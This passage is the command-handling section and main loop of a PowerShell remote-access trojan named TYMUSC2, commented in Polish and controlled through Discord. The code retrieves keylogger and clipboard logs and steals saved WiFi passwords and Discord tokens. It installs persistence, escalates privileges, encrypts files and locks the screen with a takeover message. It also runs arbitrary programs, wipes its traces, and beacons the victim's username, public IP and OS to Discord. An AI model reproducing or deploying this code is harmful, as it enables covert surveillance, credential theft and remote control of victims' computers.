            Set-Content -Path "$dataDir\kl_clip.txt" -Value $clipPath
            $response = "Keylogger URUCHOMIONY! Uzyj !getkeylog"
        }
        '^!getkeylog$|^!getkeys$' {
            $klFile = Get-Content "$dataDir\kl_file.txt" -ErrorAction SilentlyContinue
            $clipFile = Get-Content "$dataDir\kl_clip.txt" -ErrorAction SilentlyContinue
            $response = ""
            if ($klFile -and (Test-Path $klFile)) {
                $c = Get-Content $klFile -Tail 80
                if ($c) {
                    $log = $c -join "`n"
                    if ($log.Length -gt 1500) { $log = $log.Substring(0, 1500) + "...[przycieto]" }
                    $response += "KEYLOG (80 ostatnich):`n```$log```"
                }
            }
            if ($clipFile -and (Test-Path $clipFile)) {
                $cc = Get-Content $clipFile -Tail 15
                if ($cc) { $response += "`nSCHOWEK:`n$($cc -join "`n")" }
            }
            if (-not $response) { $response = "Brak logow. Uzyj !keylog" }
        }
        '^!lock$|^!block$' {
            $sb = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$f = New-Object System.Windows.Forms.Form
$f.WindowState = "Maximized"; $f.FormBorderStyle = "None"; $f.TopMost = $true; $f.BackColor = "Black"
$f.KeyPreview = $true
$f.KeyDown += { param($s,$e) $e.SuppressKeyPress=$true; $e.Handled=$true }
$l = New-Object System.Windows.Forms.Label
$l.Text = "SYSTEM ZABLOKOWANY PRZEZ TYMUSHACKER`n`nTen komputer zostal zdalnie przejety`n`nTo niemozliwe"
$l.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$l.ForeColor = "Red"; $l.BackColor = "Black"; $l.TextAlign = "MiddleCenter"
$l.Size = New-Object System.Drawing.Size(1920, 1080); $l.Location = New-Object System.Drawing.Point(0,0)
$f.Controls.Add($l)
$t = New-Object System.Windows.Forms.Timer
$t.Interval = 50; $t.Add_Tick({ $f.TopMost = $true }); $t.Start()
[System.Windows.Forms.Application]::Run($f)
'@
            Set-Content -Path "$env:TEMP\tymushacker_lock.ps1" -Value $sb
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\tymushacker_lock.ps1`"" -WindowStyle Hidden
            $response = "SYSTEM ZABLOKOWANY! Uzyj !unlock"
        }
        '^!unlock$' {
            Get-Process | Where-Object { $_.ProcessName -eq 'powershell' -and $_.MainWindowTitle -eq '' } | Stop-Process -Force -ErrorAction SilentlyContinue
            $response = "Proba odblokowania..."
        }
        '^!open (.+)$' {
            try { Start-Process $matches[1]; $response = "Otwarto: $($matches[1])" }
            catch { $response = "Blad: $($_.Exception.Message)" }
        }
        '^!chrome$' {
            try { Start-Process chrome -ArgumentList "--new-window https://www.youtube.com/watch?v=dQw4w9WgXcQ"; $response = "Chrome uruchomiony" }
            catch { $response = "Blad Chrome" }
        }
        '^!type (.+)$' {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait($matches[1])
            $response = "Wpisano: $($matches[1])"
        }
        '^!alert (.+)$' {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($matches[1], "ALERT!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            $response = "Alert wyslany"
        }
        '^!wifi$' {
            $nets = Get-WiFiPasswords
            if ($nets.Count -gt 0) {
                $response = "SIECI WiFi ($($nets.Count)):`n"
                foreach ($n in $nets) {
                    $response += "$($n.Profile) | Haslo: $($n.Password)`n"
                    if ($response.Length -gt 1800) { $response += "...[przycieto]"; break }
                }
            } else { $response = "Brak sieci WiFi" }
        }
        '^!tokens$|^!browsers$' {
            $tokens = Get-DiscordTokens
            $response = "DISCORD TOKENY ($($tokens.Count)):`n"
            if ($tokens.Count -gt 0) { foreach ($t in $tokens) { $response += "$($t.Token)`n" } }
            else { $response += "Brak tokenow Discord`n" }
        }
        '^!persist$|^!install$' {
            $response = Persist-Script
        }
        '^!clean$|^!remove$' {
            $response = Remove-Persistence
        }
        '^!elevate$|^!admin$' {
            $response = Elevate-ToAdmin
        }
        '^!netstat$' {
            $conns = Get-NetworkConnections
            if ($conns.Count -gt 0) { $response = "POLACZENIA TCP:`n" + ($conns -join "`n") }
            else { $response = "Brak polaczen" }
        }
        '^!arp$' {
            $arp = Get-ARP
            if ($arp.Count -gt 0) { $response = "TABELA ARP:`n" + ($arp -join "`n") }
            else { $response = "Blad ARP" }
        }
        '^!uptime$' {
            $i = Get-ComprehensiveInfo
            $response = "UPTIME: $($i.Uptime)`nLast Boot: $($i.LastBoot)"
        }
        '^!idle$' {
            try {
                Add-Type @'
using System; using System.Runtime.InteropServices;
public class IL {
    [DllImport("user32.dll")] static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    public static uint Get() {
        LASTINPUTINFO li = new LASTINPUTINFO(); li.cbSize = (uint)Marshal.SizeOf(li);
        GetLastInputInfo(ref li); return (uint)Environment.TickCount - li.dwTime;
    }
}
'@
                $idle = [IL]::Get() / 1000
                $response = "Bezczynnosc: $idle sekund"
            } catch { $response = "Blad" }
        }
        '^!wallpaper (.+)$' {
            $response = Set-Wallpaper -ImagePath $matches[1]
        }
        '^!sysinfo$|^!hide$|^!min$|^!max$|^!move' {
            # Obsluga tych komend juz jest wyzej, ale dajemy cos na domyslny
        }
        '^!encrypt (.+)$' {
            $result = EncryptFile -Path $matches[1]
            if ($result) { $response = "Zaszyfrowano: $result" }
            else { $response = "Blad szyfrowania" }
        }
        '^!decrypt (.+)$' {
            $result = DecryptFile -Path $matches[1]
            if ($result) { $response = "Odszyfrowano: $result" }
            else { $response = "Blad deszyfrowania" }
        }
        '^!hide$' {
            try {
                $cp = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($cp, 0) | Out-Null
                $response = "Konsola ukryta"
                Send-DiscordMessage -Content $response; return
            } catch { $response = "Blad" }
        }
        '^!min$' {
            try {
                $cp = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($cp, 6) | Out-Null
                $response = "Zminimalizowano"
            } catch { $response = "Blad" }
        }
        '^!max$' {
            try {
                $cp = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($cp, 3) | Out-Null
                $response = "Zmaksymalizowano"
            } catch { $response = "Blad" }
        }
        '^!move (\d+) (\d+)$' {
            $x = [int]$matches[1]; $y = [int]$matches[2]
            try {
                $cp = [Console.Window]::GetConsoleWindow()
                Add-Type @'
using System; using System.Runtime.InteropServices;
public class WM { [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h, IntPtr ha, int x, int y, int cx, int cy, uint f); }
'@
                [WM]::SetWindowPos($cp, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001) | Out-Null
                $response = "Przesunieto na ($x, $y)"
            } catch { $response = "Blad" }
        }
        '^!exit$|^!quit$' {
            $response = "Wylaczanie TYMUSC2..."
            Send-DiscordMessage -Content $response; exit
        }
        '^!clear$' {
            $paths = @("$env:TEMP\tymushacker_data","$env:TEMP\kl_runner.ps1","$env:TEMP\tymushacker_lock.ps1","$dataDir")
            foreach ($p in $paths) { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue }
            $response = "Wyczyszczono slady"
        }
        '^!help$|^!commands$' {
            $response = "KOMENDY TYMUSC2 v2.0:`n"
            $response += "`nINFO: !info !sysinfo !ip !ps !uptime !idle !clipboard"
            $response += "`nEKRAN: !screenshot !ssall !webcam !record !stoprecord"
            $response += "`nSYSTEM: !shell <cmd> !kill <PID> !shutdown !restart !elevate"
            $response += "`nBLOKADA: !lock !unlock !hide !min !max !move X Y"
            $response += "`nSIEC: !netstat !arp !wifi !tokens"
            $response += "`nPLIKI: !dir !upload !grab !download !search !encrypt !decrypt"
            $response += "`nPRANKI: !msg !alert !speak !type !open !chrome !wallpaper"
            $response += "`nKEYLOGGER: !keylog !getkeylog"
            $response += "`nZARZADZANIE: !persist !clean !clear !exit"
        }
        default {
            $response = "Nieznana: $Command`n!help"
        }
    }
    return $response
}

# ===== GLOWNA PETLA =====
if (-not (Test-Path $dataDir)) { New-Item -ItemType Directory -Path $dataDir -Force | Out-Null }
if ($Startup) { Persist-Script | Out-Null }

$startInfo = Get-ComprehensiveInfo
Send-DiscordMessage -Content "TYMUSC2 v2.0 AKTYWNY - $($startInfo.ComputerName)"
Send-DiscordMessage -Content "User: $($startInfo.Username) IP: $($startInfo.PublicIP) OS: $($startInfo.OS)"
Send-DiscordMessage -Content "Komendy: !help"

$lastCmd = ""
while ($true) {
    try {
        $cmd = Get-LastCommand
        if ($cmd -and $cmd -ne $lastCmd) {
            $lastCmd = $cmd
            $resp = Execute-Command -Command $cmd
            if ($resp) {
                if ($resp.Length -gt 1900) {
                    Send-DiscordEmbed -Title "Wykonano: $cmd" -Description ($resp.Substring(0, 1800) + "...[przycieto]")
                } else {
                    Send-DiscordMessage -Content $resp
                }
            }
        }
        Start-Sleep -Seconds $checkInterval
    } catch { Start-Sleep -Seconds 10 }
}
